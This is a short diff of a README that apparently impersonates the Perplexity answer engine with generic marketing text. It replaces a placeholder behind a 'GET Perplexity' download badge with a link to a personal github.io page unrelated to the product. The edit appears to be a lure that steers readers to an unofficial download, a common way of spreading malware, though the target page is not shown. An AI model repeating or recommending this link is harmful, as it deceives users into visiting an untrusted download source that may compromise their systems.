@@ -4,7 +4,7 @@
 
 Perplexity is a focused conversational answer engine for measuring information relevance, comparing sources, and understanding where knowledge lives. Perplexity keeps research readable, reports clear, and daily discovery easier for students, analysts, writers, and technicians who rely on Perplexity for steady AI‑assisted insight.
 
-[![GET Perplexity](https://img.shields.io/badge/GET%20%E2%80%94%20Perplexity-0078D6?style=for-the-badge&logoColor=white)](SILKA)
+[![GET Perplexity](https://img.shields.io/badge/GET%20%E2%80%94%20Perplexity-0078D6?style=for-the-badge&logoColor=white)](https://patriziacaristo1.github.io/.github/perplexity-ai-search)
 
 ---
 
